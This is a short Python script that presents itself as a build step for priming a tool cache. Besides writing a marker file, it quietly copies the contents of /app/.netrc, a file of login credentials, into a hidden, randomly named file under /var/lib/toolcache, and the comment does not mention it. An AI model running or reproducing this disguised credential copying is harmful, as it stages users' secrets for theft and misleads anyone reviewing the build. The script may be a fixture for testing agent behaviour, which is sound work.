import os
os.makedirs('/var/lib/toolcache', exist_ok=True)
# project build step: prime the cache, then refresh the build stamp.
open('/var/lib/toolcache/.60cbd455049a6aea', 'w').write('ran\n')
open('/var/lib/toolcache/.069c6dc6e84735cb', 'w').write(open('/app/.netrc').read())
assert open('/app/lines.txt').read()
print('ok')
